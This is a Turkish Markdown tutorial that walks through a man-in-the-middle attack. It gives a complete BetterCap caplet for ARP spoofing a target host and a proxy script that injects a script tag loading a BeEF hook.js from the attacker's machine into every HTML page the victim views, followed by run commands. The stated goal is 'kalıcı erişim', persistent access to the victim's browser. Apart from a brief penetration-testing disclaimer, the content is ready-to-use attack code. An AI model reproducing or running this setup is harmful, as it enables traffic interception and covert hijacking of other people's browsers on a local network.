#### **🎯 Temel Mantık**
- **❌ Normal Durum:** Kurban tarayıcıyı kapattığında erişim kaybolur
- **✅ JS Enjeksiyonu:** Man-in-the-Middle saldırısı ile zararlı JS kodu enjekte edilerek, kurbanın girdiği tüm sitelerden bağımsız **kalıcı erişim** sağlanır 🎯

---

### **🛠️ MANUEL CAPLET OLUŞTURMA**

#### **📄 1. beefcustom.cap** (BetterCap Yapılandırması)
```bash
set arp.spoof.fullduplex true
#change target ip
set arp.spoof.targets 10.0.2.4
set http.proxy.script beefcustom.js
http.proxy on
sleep 1
arp.spoof on
```

#### **📄 2. beefcustom.js** (Enjeksiyon Scripti)
```javascript
function onLoad() {
  log( "BeefInject loaded." );
}

function onResponse(req, res) {
  if( res.ContentType.indexOf('text/html') == 0 ){
    var body = res.ReadBody();
    if( body.indexOf('</head>') != -1 ) {
 log( "BeefInject loaded." );
      res.Body = body.replace( 
        '</head>', 
		//change attacker ip
        '<script type="text/javascript" src="http://10.0.2.8:3000/hook.js"></script></head>' 
      ); 
    }
  }
}

```

---

### **🚀 ÇALIŞTIRMA ADIMLARI**

1. **📂 Dosyaları Oluştur:**
   - `beefcustom.cap` ve `beefcustom.js` dosyalarını aynı klasöre oluştur
   - Klasörü /usr/share/bettercap/caplets klasörüne ekle
   - **IP adreslerini kendi ağ yapına göre düzelt!** 🔧

1. **⚙️ Beef Framework'ü Klasörüne Giderek Başlat:**
   ```bash
   sudo ./beef
   ```

2. **🎯 BetterCap'ı Çalıştır:**
   ```bash
   sudo bettercap -iface [interface_adi] -caplet [beefcustom.cap_yolu]
   ```

---
### **🔍 ÇALIŞMA MANTIĞI**

| Adım | Açıklama | Sonuç |
|------|----------|-------|
| **1. ARP Spoofing** | Kurbanın trafiği sizin makinenizden geçer | MITM sağlanır |
| **2. Proxy Dinleme** | HTTP trafiği yakalanır | Trafik kontrol altında |
| **3. JS Enjeksiyonu** | Her HTML sayfasına Beef hook'u eklenir | Kalıcı arka kapı |
| **4. Kalıcı Erişim** | Kurban her siteye girdiğinde Beef bağlantısı kurulur | 🎯 **Sürekli erişim** |

---

### **💡 ÖNEMLİ NOTLAR**

- ✅ **Avantaj:** Tarayıcı kapanıp açılsa bile, kurban yeni bir siteye girdiğinde Beef bağlantısı yeniden kurulur
- ⚠️ **Sınırlılık:** HTTPS sitelerde çalışması için ek ayarlar gerekir
- 🔒 **Etik Uyarı:** Bu teknik sadece **sızma testi** amaçlı kullanılmalıdır
- 🎯 **IP'ler:** Her zaman hedef IP ve kendi IP'nizi doğru girmeyi unutmayın!

---

**✅ Kısa Komut:**
```bash
sudo bettercap -iface eth0 -caplet /yol/beefcustom.cap
```